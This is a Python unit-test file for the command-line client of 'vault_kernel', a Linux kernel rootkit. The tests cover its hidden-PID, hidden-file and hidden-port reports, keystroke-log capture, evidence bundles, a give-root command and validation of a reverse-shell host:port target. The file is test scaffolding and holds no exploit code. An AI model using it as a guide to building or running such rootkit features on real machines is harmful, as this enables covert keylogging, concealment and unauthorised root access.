#!/usr/bin/env python3
"""Unit tests (stdlib unittest) for the vault_kernel CLI parsing layer.

Run directly — no external deps, mirroring the zero-dependency policy:

    python3 tests/python/test_cli_parsing.py -v

Wired into CI (Python job) since v3.6.  The suite pins the GET_STATS /
LIST_HIDDEN report formats emitted by src/ioctl.c and the regressions
fixed in v3.6: the multi-pair stats parser and the --interval units.
"""
import argparse
import contextlib
import errno
import importlib.util
import io
import json
import sys
import unittest
from pathlib import Path
from unittest import mock

REPO_ROOT = Path(__file__).resolve().parents[2]
CLIENT_PATH = REPO_ROOT / "client" / "vault_kernel_cli.py"


def _load_client():
    spec = importlib.util.spec_from_file_location(
        "vault_kernel_cli", CLIENT_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


vk = _load_client()

# EXACT snprintf block of IOCTL_GET_STATS (src/ioctl.c) for a module
# with all 7 hooks and one hidden file/pid/port each.
STATS_REPORT = (
    "module=vault_kernel version=3.12\n"
    "hooks_installed=7 hooks_planned=7\n"
    "module_hidden=0\n"
    "hidden_files=1 hidden_pids=1 hidden_ports=1\n"
    "keylog_bytes=0\n"
    "uptime_s=42\n"
)

# EXACT report layout of IOCTL_LIST_HIDDEN (src/ioctl.c).
LIST_REPORT = (
    "--- Hidden PIDs ---\n"
    "  pid: 1234\n"
    "  pid: 567\n"
    "--- Hidden Files ---\n"
    "  secret.txt\n"
    "  my dir/with space.txt\n"
    "--- Hidden Ports ---\n"
    "  port: 8080\n"
)


class TestParseStatsReport(unittest.TestCase):
    def test_kernel_fixture(self):
        self.assertEqual(vk.parse_stats_report(STATS_REPORT), {
            "module": "vault_kernel",
            "version": "3.12",
            "hooks_installed": "7",
            "hooks_planned": "7",
            "module_hidden": "0",
            "hidden_files": "1",
            "hidden_pids": "1",
            "hidden_ports": "1",
            "keylog_bytes": "0",
            "uptime_s": "42",
        })

    def test_multiple_pairs_per_line(self):
        """v3.4/v3.5 regression: the line-based parser lost every pair
        after the first on each line."""
        got = vk.parse_stats_report("module=vault_kernel version=3.12\n")
        self.assertEqual(got["module"], "vault_kernel")
        self.assertEqual(got["version"], "3.12")

    def test_empty_report(self):
        self.assertEqual(vk.parse_stats_report(""), {})

    def test_orphan_and_plain_tokens(self):
        self.assertEqual(
            vk.parse_stats_report("=orphan real=yes"), {"real": "yes"})
        self.assertEqual(vk.parse_stats_report("plain tokens here"), {})

    def test_first_equal_only(self):
        self.assertEqual(vk.parse_stats_report("a=b=c"), {"a": "b=c"})


class TestParseHiddenList(unittest.TestCase):
    def test_kernel_fixture(self):
        self.assertEqual(vk.parse_hidden_list(LIST_REPORT), {
            "pids": [1234, 567],
            "files": ["secret.txt", "my dir/with space.txt"],
            "ports": [8080],
        })

    def test_file_named_like_entry(self):
        """Section context decides — a file named "pid: 5" stays a file."""
        report = ("--- Hidden PIDs ---\n"
                  "--- Hidden Files ---\n"
                  "  pid: 5\n"
                  "--- Hidden Ports ---\n")
        got = vk.parse_hidden_list(report)
        self.assertEqual(got, {"pids": [], "files": ["pid: 5"], "ports": []})

    def test_empty_report(self):
        report = ("--- Hidden PIDs ---\n"
                  "--- Hidden Files ---\n"
                  "--- Hidden Ports ---\n")
        self.assertEqual(
            vk.parse_hidden_list(report),
            {"pids": [], "files": [], "ports": []})

    def test_garbage_numbers_skipped(self):
        report = ("--- Hidden PIDs ---\n"
                  "  pid: x\n"
                  "  pid: 9\n"
                  "--- Hidden Ports ---\n"
                  "  port: \n"
                  "  port: 80\n")
        got = vk.parse_hidden_list(report)
        self.assertEqual(got["pids"], [9])
        self.assertEqual(got["ports"], [80])


class TestStatsJsonEndToEnd(unittest.TestCase):
    """stats(as_json=True) against a stubbed ioctl must emit complete,
    valid JSON — regression for the v3.5 broken parser."""

    def test_stats_json_complete(self):
        c = vk.VaultKernelClient()
        c._open = lambda: None
        c._close = lambda: None

        def fake_ioctl(request, buf=None):
            if buf is not None:
                data = STATS_REPORT.encode()
                buf[:len(data)] = data
            return True

        c._ioctl = fake_ioctl
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            c.stats(as_json=True)
        parsed = json.loads(out.getvalue())
        self.assertEqual(parsed["schema"], 1)
        self.assertEqual(parsed["module"], "vault_kernel")
        self.assertEqual(parsed["version"], "3.12")
        self.assertEqual(parsed["hooks_installed"], 7)
        self.assertEqual(parsed["hooks_planned"], 7)
        self.assertEqual(parsed["module_hidden"], 0)
        self.assertEqual(parsed["hidden_files"], 1)
        self.assertEqual(parsed["hidden_pids"], 1)
        self.assertEqual(parsed["hidden_ports"], 1)
        self.assertEqual(parsed["keylog_bytes"], 0)
        self.assertEqual(parsed["uptime_s"], 42)
        for key in ("hooks_installed", "hooks_planned", "hidden_files",
                    "hidden_pids", "hidden_ports", "keylog_bytes",
                    "uptime_s"):
            self.assertIsInstance(parsed[key], int, key)


class TestDoctorJsonEndToEnd(unittest.TestCase):
    """doctor(as_json=True) against a stubbed device/ioctl: full schema."""

    def _run_doctor_json(self, stats_report=STATS_REPORT, sysfs=False):
        stats_buf = bytearray(4096)
        data = stats_report.encode()
        stats_buf[:len(data)] = data

        def fake_ioctl(fd, request, buf=None):
            if buf is not None:
                buf[:] = stats_buf
            return 0

        # st.st_mode must be a real int for stat.filemode()
        with mock.patch.object(vk.os, "stat",
                               return_value=mock.Mock(st_mode=33188)), \
             mock.patch.object(vk.os, "open", return_value=42), \
             mock.patch.object(vk.os, "close"), \
             mock.patch.object(vk.os.path, "isdir", return_value=sysfs), \
             mock.patch.object(vk.fcntl, "ioctl", side_effect=fake_ioctl), \
             contextlib.redirect_stdout(io.StringIO()) as out:
            vk.run_doctor(as_json=True)
        return json.loads(out.getvalue())

    def test_doctor_json_ok(self):
        parsed = self._run_doctor_json()
        self.assertEqual(parsed["schema"], 1)
        self.assertTrue(parsed["device_present"])
        self.assertTrue(parsed["device_open"])
        self.assertTrue(parsed["stats_responds"])
        self.assertEqual(parsed["module_version"], "3.12")
        self.assertTrue(parsed["version_match"])
        self.assertEqual(parsed["uptime_s"], 42)
        self.assertEqual(parsed["hooks_installed"], 7)
        self.assertEqual(parsed["hooks_planned"], 7)
        self.assertFalse(parsed["module_in_sysfs"])
        self.assertTrue(parsed["keylog_responds"])
        self.assertTrue(parsed["list_responds"])
        self.assertEqual(parsed["warnings"], 0)
        self.assertEqual(parsed["client_version"], vk.CLIENT_VERSION)

    def test_doctor_json_version_mismatch_warns(self):
        parsed = self._run_doctor_json(
            stats_report=STATS_REPORT.replace("version=3.12", "version=3.0"))
        self.assertFalse(parsed["version_match"])
        self.assertEqual(parsed["warnings"], 1)

    def test_doctor_json_device_missing_fails(self):
        with mock.patch.object(vk.os, "stat",
                               side_effect=OSError("no device")), \
             contextlib.redirect_stdout(io.StringIO()) as out:
            with self.assertRaises(SystemExit) as ctx:
                vk.run_doctor(as_json=True)
        self.assertEqual(ctx.exception.code, 1)
        parsed = json.loads(out.getvalue())
        self.assertEqual(parsed["schema"], 1)
        self.assertFalse(parsed["device_present"])
        self.assertNotIn("device_open", parsed)
        self.assertEqual(parsed["warnings"], 0)


class TestFormatWatchPanel(unittest.TestCase):
    """format_watch_panel is the user-facing layout contract of the new
    `watch` command (v3.7): keys sorted and column-aligned at the widest
    key, "(none)" for empty hidden sections, "(no stats)" placeholder.
    Mirrors TestRenderWatchPanel in the Go client."""

    STATS = {
        "module": "vault_kernel", "version": "3.12",
        "hooks_installed": "7", "hooks_planned": "7",
        "module_hidden": "0", "hidden_files": "1", "hidden_pids": "1",
        "hidden_ports": "1", "keylog_bytes": "0", "uptime_s": "42",
    }
    HIDDEN = {"pids": [1234, 567], "files": ["secret.txt",
                                              "my dir/with space.txt"],
              "ports": [8080]}

    def test_full_frame(self):
        got = vk.format_watch_panel(self.STATS, self.HIDDEN, 1000,
                                    "01:42:10")
        self.assertIn("vault_kernel watch — refresh 1000 ms — "
                      "updated 01:42:10 — Ctrl-C to stop", got)
        self.assertIn("== stats ==", got)
        self.assertIn("== hidden ==", got)
        # Keys sorted alphabetically.
        self.assertLess(got.index("hooks_installed"),
                        got.index("hooks_planned"))
        # Column alignment: widest key ("hooks_installed", 15) pads the
        # rest; the format adds " : " so "version" gets 9 spaces.
        self.assertIn("version         : 3.12", got)
        self.assertIn("pids : 1234, 567", got)
        self.assertIn("files: secret.txt, my dir/with space.txt", got)
        self.assertIn("ports: 8080", got)

    def test_empty_sections(self):
        got = vk.format_watch_panel({}, {"pids": [], "files": [],
                                         "ports": []}, 500, "00:00:00")
        self.assertIn("stats: (no stats)", got)
        self.assertIn("pids : (none)", got)
        self.assertIn("files: (none)", got)
        self.assertIn("ports: (none)", got)


class TestListJsonEndToEnd(unittest.TestCase):
    """list(as_json=True) against a stubbed ioctl: versioned envelope
    with the three sections (v3.7 added the schema marker)."""

    def test_list_json_complete(self):
        c = vk.VaultKernelClient()
        c._open = lambda: None
        c._close = lambda: None

        def fake_ioctl(request, buf=None):
            if buf is not None:
                data = LIST_REPORT.encode()
                buf[:len(data)] = data
            return True

        c._ioctl = fake_ioctl
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            c.list_hidden(as_json=True)
        parsed = json.loads(out.getvalue())
        self.assertEqual(parsed["schema"], 1)
        self.assertEqual(parsed["pids"], [1234, 567])
        self.assertEqual(parsed["files"],
                         ["secret.txt", "my dir/with space.txt"])
        self.assertEqual(parsed["ports"], [8080])

    def test_list_json_empty_sections(self):
        c = vk.VaultKernelClient()
        c._open = lambda: None
        c._close = lambda: None

        empty_report = ("--- Hidden PIDs ---\n--- Hidden Files ---\n"
                        "--- Hidden Ports ---\n")

        def fake_ioctl(request, buf=None):
            if buf is not None:
                data = empty_report.encode()
                buf[:len(data)] = data
            return True

        c._ioctl = fake_ioctl
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            c.list_hidden(as_json=True)
        parsed = json.loads(out.getvalue())
        self.assertEqual(parsed["schema"], 1)
        self.assertEqual(parsed["pids"], [])
        self.assertEqual(parsed["files"], [])
        self.assertEqual(parsed["ports"], [])


class TestIntervalUnits(unittest.TestCase):
    """`keylog --interval` is documented in MILLISECONDS (parity with
    the Go client).  v3.5 slept seconds instead — 1000x slower."""

    def test_ms_to_seconds(self):
        self.assertEqual(vk._interval_ms_to_seconds(500), 0.5)
        self.assertEqual(vk._interval_ms_to_seconds(200), 0.2)

    def test_minimum_50ms(self):
        self.assertEqual(vk._interval_ms_to_seconds(50), 0.05)
        self.assertEqual(vk._interval_ms_to_seconds(10), 0.05)

    def test_default_is_500ms(self):
        self.assertEqual(vk.KEYLOG_DEFAULT_INTERVAL_MS, 500)


class TestIntervalArgType(unittest.TestCase):
    """v3.6 accepted float for --interval, so `--interval nan`/`inf`
    reached time.sleep() and died with a raw ValueError/OverflowError
    instead of a usage error.  v3.7 parses interval args with
    _ms_arg: integer text, no negatives, non-finite rejected by the
    int() conversion itself."""

    def test_accepts_integer_text(self):
        self.assertEqual(vk._ms_arg("500"), 500)
        self.assertEqual(vk._ms_arg("50"), 50)

    def test_rejects_non_integer_text(self):
        for bad in ("nan", "inf", "abc", "0.5"):
            with self.assertRaises(argparse.ArgumentTypeError, msg=bad):
                vk._ms_arg(bad)

    def test_rejects_negative(self):
        with self.assertRaises(argparse.ArgumentTypeError):
            vk._ms_arg("-5")

    def test_watch_default_is_1000ms(self):
        self.assertEqual(vk.WATCH_DEFAULT_INTERVAL_MS, 1000)


class TestFormatKeylogEvent(unittest.TestCase):
    """format_keylog_event is the user-facing contract of one
    `keylog --follow` event (v3.8 added --timestamps) — mirrors
    TestFormatKeylogEvent in the Go client: timestamps put every event
    on a fresh [HH:MM:SS]-prefixed line; without them a suffix diff
    continues the line and a buffer wrap starts a new one."""

    def test_continuation_without_timestamps(self):
        self.assertEqual(vk.format_keylog_event("def"), "def")

    def test_wrap_without_timestamps(self):
        self.assertEqual(vk.format_keylog_event("wrapped", wrapped=True),
                         "\nwrapped")

    def test_timestamps_start_a_fresh_line(self):
        self.assertEqual(vk.format_keylog_event("def", "10:30:05"),
                         "\n[10:30:05] def")
        self.assertEqual(
            vk.format_keylog_event("wrapped", "10:30:05", wrapped=True),
            "\n[10:30:05] wrapped")

    def test_content_never_mangled(self):
        got = vk.format_keylog_event("my dir/with space.txt", "00:00:00")
        self.assertTrue(got.endswith("my dir/with space.txt"))


class TestBuildCaptureBundle(unittest.TestCase):
    """build_capture_bundle is the 4th JSON document (v3.9) — mirrors
    TestBuildCaptureReport in the Go client: envelope keys in
    contractual order, stats numeric-and-sorted, keylog verbatim."""

    STATS_RAW = {
        "module": "vault_kernel", "version": "3.12",
        "hooks_installed": "7", "hooks_planned": "7",
        "module_hidden": "0", "hidden_files": "1", "hidden_pids": "1",
        "hidden_ports": "1", "keylog_bytes": "7", "uptime_s": "42",
    }
    HIDDEN = {"pids": [1234], "files": ["secret.txt"], "ports": [8080]}

    def test_bundle_shape(self):
        got = vk.build_capture_bundle(
            self.STATS_RAW, self.HIDDEN, "hello",
            "2026-09-15T10:30:05Z", False)
        self.assertEqual(list(got.keys()), [
            "schema", "captured_at", "client_version",
            "hostname", "kernel_release",
            "module_in_sysfs", "stats", "hidden", "keylog"])
        self.assertEqual(got["schema"], 1)
        self.assertEqual(got["captured_at"], "2026-09-15T10:30:05Z")
        self.assertEqual(got["client_version"], vk.CLIENT_VERSION)
        # v3.12: host context (additive fields, schema stays 1).
        self.assertEqual(got["hostname"], "")
        self.assertEqual(got["kernel_release"], "")
        self.assertFalse(got["module_in_sysfs"])
        # stats: numeric conversion + sorted keys (Go map parity).
        self.assertEqual(list(got["stats"].keys()), sorted(self.STATS_RAW))
        self.assertEqual(got["stats"]["hooks_installed"], 7)
        self.assertIsInstance(got["stats"]["hooks_installed"], int)
        self.assertEqual(got["stats"]["module"], "vault_kernel")
        # hidden: three sections, verbatim.
        self.assertEqual(got["hidden"], self.HIDDEN)

    def test_host_context_roundtrip(self):
        """v3.12: hostname/kernel_release travel with the bundle in
        the contractual position (after client_version)."""
        got = vk.build_capture_bundle(
            self.STATS_RAW, self.HIDDEN, "hello",
            "2026-09-15T10:30:05Z", False,
            hostname="lab-host", kernel_release="6.8.0-45-generic")
        self.assertEqual(got["hostname"], "lab-host")
        self.assertEqual(got["kernel_release"], "6.8.0-45-generic")
        keys = list(got.keys())
        self.assertEqual(keys.index("client_version") + 1,
                         keys.index("hostname"))
        self.assertEqual(keys.index("hostname") + 1,
                         keys.index("kernel_release"))
        # keylog text passes through untouched.
        self.assertEqual(got["keylog"], "hello")

    def test_bundle_hidden_defaults(self):
        """Missing hidden sections render as [] — never KeyError/null."""
        got = vk.build_capture_bundle({}, {}, "", "t", True)
        self.assertEqual(got["hidden"], {"pids": [], "files": [],
                                         "ports": []})
        self.assertTrue(got["module_in_sysfs"])
        self.assertEqual(got["stats"], {})


class TestCaptureEndToEnd(unittest.TestCase):
    """capture(out=...) against stubbed ioctls: JSON to stdout, file
    mode writes 0600 and prints the summary line."""

    def _client(self):
        c = vk.VaultKernelClient()
        c._open = lambda: None
        c._close = lambda: None

        def fake_ioctl(request, buf=None):
            if buf is not None:
                data = {vk.IOCTL_GET_STATS: STATS_REPORT,
                        vk.IOCTL_LIST_HIDDEN: LIST_REPORT,
                        vk.IOCTL_KEYLOG_READ: "typed-by-user"}.get(
                            request, "").encode()
                buf[:len(data)] = data
            return True

        c._ioctl = fake_ioctl
        return c

    def test_capture_stdout(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            self._client().capture()
        parsed = json.loads(out.getvalue())
        self.assertEqual(parsed["schema"], 1)
        self.assertEqual(parsed["stats"]["hooks_installed"], 7)
        self.assertEqual(parsed["hidden"]["pids"], [1234, 567])
        self.assertEqual(parsed["keylog"], "typed-by-user")
        self.assertIn("captured_at", parsed)

    def test_capture_out_file(self):
        import os as _os
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            path = _os.path.join(tmp, "evidence.json")
            out = io.StringIO()
            with contextlib.redirect_stdout(out):
                self._client().capture(out=path)
            self.assertIn(f"[+] Evidence bundle written to {path}",
                          out.getvalue())
            st = _os.stat(path)
            self.assertEqual(st.st_mode & 0o777, 0o600)
            with open(path, encoding="utf-8") as fh:
                parsed = json.load(fh)
            self.assertEqual(parsed["schema"], 1)
            self.assertEqual(parsed["keylog"], "typed-by-user")


class TestCaptureStdoutFlag(unittest.TestCase):
    """v3.11: capture --stdout — file AND pure-JSON stdout; the summary
    moves to stderr so `| jq` pipelines stay clean (Go parity)."""

    def _client(self):
        c = vk.VaultKernelClient()
        c._open = lambda: None
        c._close = lambda: None

        def fake_ioctl(request, buf=None):
            if buf is not None:
                data = {vk.IOCTL_GET_STATS: STATS_REPORT,
                        vk.IOCTL_LIST_HIDDEN: LIST_REPORT,
                        vk.IOCTL_KEYLOG_READ: "typed-by-user"}.get(
                            request, "").encode()
                buf[:len(data)] = data
            return True

        c._ioctl = fake_ioctl
        return c

    def test_capture_stdout_with_file(self):
        import os as _os
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            path = _os.path.join(tmp, "evidence.json")
            out, err = io.StringIO(), io.StringIO()
            with contextlib.redirect_stdout(out), \
                    contextlib.redirect_stderr(err):
                self._client().capture(out=path, to_stdout=True)
            # stdout: pure JSON (jq-safe).
            parsed = json.loads(out.getvalue())
            self.assertEqual(parsed["schema"], 1)
            self.assertEqual(parsed["keylog"], "typed-by-user")
            # stderr: the one-line summary.
            self.assertIn(f"[+] Evidence bundle written to {path}",
                          err.getvalue())
            # file written 0600 with the same document.
            st = _os.stat(path)
            self.assertEqual(st.st_mode & 0o777, 0o600)
            with open(path, encoding="utf-8") as fh:
                self.assertEqual(json.load(fh)["schema"], 1)

    def test_capture_stdout_without_file_is_plain_json(self):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), \
                contextlib.redirect_stderr(err):
            self._client().capture(to_stdout=True)
        parsed = json.loads(out.getvalue())
        self.assertEqual(parsed["schema"], 1)
        self.assertEqual(err.getvalue(), "")

    def test_capture_stdoutfile_grammar(self):
        """The argparse surface accepts --stdout alone and with --out,
        and --stdout is a boolean (no operand)."""
        parser = argparse.ArgumentParser()
        sub = parser.add_subparsers(dest="command")
        sp = sub.add_parser("capture")
        sp.add_argument("--out", default=None)
        sp.add_argument("--stdout", action="store_true")
        a = parser.parse_args(["capture", "--stdout"])
        self.assertTrue(a.stdout)
        self.assertIsNone(a.out)
        a = parser.parse_args(["capture", "--out", "f.json", "--stdout"])
        self.assertTrue(a.stdout)
        self.assertEqual(a.out, "f.json")


class TestRootWarningSurface(unittest.TestCase):
    """v3.11: the non-root warning must NOT pollute the no-root
    workflow.  Regression for the v3.10 defect: `status --json` as
    non-root printed the warning to STDOUT, so `| jq` died parsing
    "[!] Warning..." (the Go client warned on stderr and stayed
    clean).  Runs the REAL CLI in a subprocess — the only way to pin
    the stream separation end to end."""

    def _run_cli(self, *argv):
        import os
        import subprocess
        import sys
        env = dict(os.environ)
        env["PYTHONPATH"] = ""
        return subprocess.run(
            [sys.executable, str(CLIENT_PATH), *argv],
            capture_output=True, text=True, env=env,
            timeout=30)

    def test_status_json_stdout_is_pure_json(self):
        r = self._run_cli("status", "--json")
        self.assertEqual(r.returncode, 0, r.stderr)
        # This parse IS the regression: pre-v3.11 stdout started with
        # "[!] Warning: not running as root..." when non-root.
        doc = json.loads(r.stdout)
        self.assertEqual(doc["schema"], 1)
        self.assertFalse(doc["device_present"])

    def test_status_json_stderr_is_empty(self):
        r = self._run_cli("status", "--json")
        self.assertEqual(r.stderr, "",
                         "no-root status must not warn on stderr")

    def test_no_root_required_set(self):
        # Parity with the Go deviceRequired list.
        self.assertEqual(
            vk._NO_ROOT_REQUIRED,
            {"status", "version", "help", "magic-encode"})


class TestKeylogStopAfter(unittest.TestCase):
    """v3.11: keylog --stop-after N — argparse surface and the
    follow-only guard."""

    def test_grammar_type(self):
        parser = argparse.ArgumentParser()
        sub = parser.add_subparsers(dest="command")
        sp = sub.add_parser("keylog")
        sp.add_argument("--stop-after", type=vk._stop_after_arg,
                        default=None)
        self.assertEqual(parser.parse_args(
            ["keylog", "--stop-after", "5"]).stop_after, 5)
        self.assertEqual(parser.parse_args(
            ["keylog", "--stop-after", "1"]).stop_after, 1)
        for bad in ("0", "-3", "abc"):
            with self.assertRaises(SystemExit):
                parser.parse_args(["keylog", "--stop-after", bad])

    def test_requires_follow(self):
        """v3.12: usage class — exit 2 with the message on stderr (it
        used to exit 1 like a runtime error)."""
        import io as _io
        import contextlib as _contextlib
        c = vk.VaultKernelClient()
        err = _io.StringIO()
        with self.assertRaises(SystemExit) as ctx, \
                _contextlib.redirect_stderr(err):
            c.keylog_read(stop_after=5)
        self.assertEqual(ctx.exception.code, 2)
        self.assertIn("--stop-after requires --follow", err.getvalue())

    def test_loop_stops_after_n_events(self):
        """The follow loop ends after N emitted events with the SAME
        farewell as the signals, and the sink stays consistent."""
        import tempfile
        payloads = ["aaa", "aaabbb", "aaabbbccc", "aaabbbcccddd"]

        def fake_ioctl(request, buf=None):
            if request == vk.IOCTL_KEYLOG_READ and buf is not None:
                idx = min(fake_ioctl.calls, len(payloads) - 1)
                data = payloads[idx].encode()
                buf[:len(data)] = data
                fake_ioctl.calls += 1
            return True
        fake_ioctl.calls = 0

        c = vk.VaultKernelClient()
        c._open = lambda: None
        c._close = lambda: None
        c._ioctl = fake_ioctl
        with tempfile.TemporaryDirectory() as tmp:
            import os as _os
            path = _os.path.join(tmp, "cap.log")
            out = io.StringIO()
            with contextlib.redirect_stdout(out):
                # 50 ms -> seconds conversion is irrelevant here: the
                # loop breaks on the 2nd event before ever sleeping out
                # of a second poll.
                c.keylog_read(follow=True, interval=0.0001,
                              output=path, stop_after=2)
            text = out.getvalue()
            self.assertIn("[*] Follow stopped", text)
            # Events 1 and 2 emitted ("aaa", then "bbb" diff), no more.
            self.assertIn("aaa", text)
            self.assertIn("bbb", text)
            self.assertNotIn("ccc", text)
            with open(path, encoding="utf-8") as fh:
                self.assertIn("bbb", fh.read())
                self.assertNotIn("ccc", fh.read())


class TestKeylogOutput(unittest.TestCase):
    """keylog_read(output=...) (v3.9): one-shot writes the buffer as one
    record; follow writes each event with a trailing newline; the file
    is created 0600 and appending after reopen never truncates."""

    def _client(self, keylog_text):
        c = vk.VaultKernelClient()
        c._open = lambda: None
        c._close = lambda: None

        def fake_ioctl(request, buf=None):
            if request == vk.IOCTL_KEYLOG_READ and buf is not None:
                data = keylog_text.encode()
                buf[:len(data)] = data
            return True

        c._ioctl = fake_ioctl
        return c

    def test_oneshot_writes_record(self):
        import os as _os
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            path = _os.path.join(tmp, "cap.log")
            out = io.StringIO()
            with contextlib.redirect_stdout(out):
                self._client("abc").keylog_read(follow=False, output=path)
            self.assertIn("[*] Keystroke log:", out.getvalue())
            with open(path, encoding="utf-8") as fh:
                self.assertEqual(fh.read(), "abc\n")
            self.assertEqual(_os.stat(path).st_mode & 0o777, 0o600)

    def test_oneshot_empty_writes_nothing(self):
        import os as _os
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            path = _os.path.join(tmp, "cap.log")
            out = io.StringIO()
            with contextlib.redirect_stdout(out):
                self._client("").keylog_read(follow=False, output=path)
            self.assertIn("[*] (no keystrokes captured)",
                          out.getvalue())
            self.assertFalse(_os.path.exists(path))

    def test_follow_writes_events(self):
        import os as _os
        import tempfile
        # The follow loop must END: the stub answers the first poll with
        # content and FAILS the second one (device gone), so the method
        # breaks out instead of looping until the test times out.
        calls = {"n": 0}

        def two_polls(request, buf=None):
            calls["n"] += 1
            if calls["n"] == 1 and buf is not None:
                data = "abcdef".encode()
                buf[:len(data)] = data
                return True
            return False

        c = vk.VaultKernelClient()
        c._open = lambda: None
        c._close = lambda: None
        c._ioctl = two_polls
        with tempfile.TemporaryDirectory() as tmp:
            path = _os.path.join(tmp, "cap.log")
            with contextlib.redirect_stdout(io.StringIO()):
                c.keylog_read(follow=True, interval=0.001, output=path)
            with open(path, encoding="utf-8") as fh:
                content = fh.read()
            # One event (the full diff), flushed with trailing newline.
            self.assertEqual(content, "abcdef\n")

    def test_unwritable_output_fails_fast(self):
        import os as _os
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            bad = _os.path.join(tmp, "no-such-dir", "cap.log")
            with self.assertRaises(SystemExit):
                self._client("abc").keylog_read(follow=False, output=bad)


class TestVersionCommand(unittest.TestCase):
    """v3.8: the Python CLI gains `version` (the Go CLI had it since
    v3.6 — parity gap).  format_version_line mirrors Go's printVersion:
    same wording, same ioctl magic (0xC0) and signal trigger (35)."""

    def test_format_version_line(self):
        self.assertEqual(
            vk.format_version_line(),
            f"vault_kernel CLI v{vk.CLIENT_VERSION} "
            "(ioctl magic 0xC0, signal trigger 35)")

    def test_version_command_prints(self):
        out = io.StringIO()
        with mock.patch.object(vk.sys, "argv",
                               ["vault_kernel_cli.py", "version"]), \
             contextlib.redirect_stdout(out):
            vk.main()
        self.assertIn(vk.format_version_line(), out.getvalue())



class TestPidArg(unittest.TestCase):
    """_pid_arg (v3.9): hide-pid/unhide-pid require a REAL pid (>= 1) —
    0/negative used to reach the module and be stored verbatim in the
    hide-list. Parity with the Go parsePIDArg. give-root keeps its own
    contract (pid <= 0 = self) and does NOT use this type."""

    def test_accepts_positive(self):
        self.assertEqual(vk._pid_arg("42"), 42)
        self.assertEqual(vk._pid_arg("1"), 1)

    def test_rejects_zero_negative_garbage(self):
        for bad in ("0", "-5", "abc", "1.5"):
            with self.assertRaises(argparse.ArgumentTypeError, msg=bad):
                vk._pid_arg(bad)


class TestShellTargetArg(unittest.TestCase):
    """_shell_target_arg (v3.9): the Python CLI used to validate
    NOTHING for `shell` — any string reached the ioctl. Parity with
    the Go parseShellTarget: exactly one colon, non-empty host,
    numeric port 1-65535, IPv6 rejected client-side."""

    def test_accepts_valid_targets(self):
        for ok in ("10.0.0.1:4444", "localhost:8080", "h-1:1",
                   "203.0.113.9:65535"):
            self.assertEqual(vk._shell_target_arg(ok), ok)

    def test_rejects_invalid_targets(self):
        for bad in ("10.0.0.1", ":4444", "10.0.0.1:", "abc:def",
                    "10.0.0.1:0", "10.0.0.1:-5", "10.0.0.1:65536",
                    "10.0.0.1:44:44", ""):
            with self.assertRaises(argparse.ArgumentTypeError, msg=bad):
                vk._shell_target_arg(bad)


class TestFormatWatchPanelPrev(unittest.TestCase):
    """format_watch_panel(prev_stats=...) (v3.10) — mirrors
    TestRenderWatchPanelDiff in the Go client: changed stats get
    " (was X)", unseen keys get " (new)", prev=None renders the
    classic panel unchanged."""

    PREV = {
        "module": "vault_kernel", "version": "3.12",
        "hooks_installed": "7", "hooks_planned": "7",
        "module_hidden": "0", "hidden_files": "1", "hidden_pids": "1",
        "hidden_ports": "1", "keylog_bytes": "0", "uptime_s": "42",
    }
    CUR = {
        "module": "vault_kernel", "version": "3.12",
        "hooks_installed": "7", "hooks_planned": "7",
        "module_hidden": "0", "hidden_files": "2", "hidden_pids": "1",
        "hidden_ports": "1", "keylog_bytes": "11", "uptime_s": "43",
    }
    HIDDEN = {"pids": [], "files": ["x"], "ports": []}

    def test_changed_values_annotated(self):
        got = vk.format_watch_panel(self.CUR, self.HIDDEN, 1000,
                                    "01:42:10", self.PREV)
        self.assertIn("uptime_s        : 43 (was 42)", got)
        self.assertIn("keylog_bytes    : 11 (was 0)", got)
        self.assertIn("hidden_files    : 2 (was 1)", got)

    def test_unchanged_not_annotated(self):
        got = vk.format_watch_panel(self.CUR, self.HIDDEN, 1000,
                                    "01:42:10", self.PREV)
        self.assertNotIn("(was 7)", got)
        self.assertIn("hooks_planned   : 7", got)

    def test_new_key_annotated(self):
        cur = dict(self.CUR, fresh="1")
        got = vk.format_watch_panel(cur, self.HIDDEN, 1000,
                                    "01:42:10", self.PREV)
        self.assertIn("fresh           : 1 (new)", got)

    def test_none_prev_is_classic_panel(self):
        diff = vk.format_watch_panel(self.CUR, self.HIDDEN, 1000,
                                     "01:42:10")
        plain = vk.format_watch_panel(self.CUR, self.HIDDEN, 1000,
                                      "01:42:10")
        self.assertEqual(diff, plain)
        self.assertNotIn("(was ", diff)


class TestParseModinfo(unittest.TestCase):
    """parse_modinfo (v3.10): exact contract keys, first occurrence
    wins, empty values skipped — mirrors TestParseModinfo in Go.  The
    old substring scan printed srcversion too."""

    FULL = ("filename:       /lib/modules/6.1.0/vault_kernel.ko\n"
            "srcversion:     ABC123\n"
            "version:        3.12\n"
            "author:         ruby570bocadito\n"
            "description:    vault_kernel kernel rootkit\n"
            "license:        GPL\n")

    def test_full_output(self):
        got = vk.parse_modinfo(self.FULL)
        self.assertEqual(got, {
            "filename": "/lib/modules/6.1.0/vault_kernel.ko",
            "version": "3.12",
            "author": "ruby570bocadito",
            "description": "vault_kernel kernel rootkit",
        })

    def test_subset_and_empty(self):
        got = vk.parse_modinfo("version:  3.12\nlicense: GPL\n")
        self.assertEqual(got, {"version": "3.12"})
        self.assertEqual(vk.parse_modinfo("license: GPL\nvermagic: x\n"),
                         {})
        self.assertEqual(vk.parse_modinfo(""), {})

    def test_empty_value_skipped_first_occurrence_wins(self):
        got = vk.parse_modinfo("version:\nversion: 3.12\n")
        self.assertEqual(got, {"version": "3.12"})
        got = vk.parse_modinfo("version: 3.12\nversion: 9.9\n")
        self.assertEqual(got, {"version": "3.12"})


class TestBuildStatusDocument(unittest.TestCase):
    """build_status_document (v3.10): 5th JSON envelope — schema,
    device_present, module_in_sysfs always; modinfo omitted when the
    probe found nothing (never null).  Mirrors TestBuildStatusReport
    in Go."""

    def test_full_document(self):
        got = vk.build_status_document(True, False, {
            "filename": "/x/vault_kernel.ko", "version": "3.12",
            "author": "ruby570bocadito",
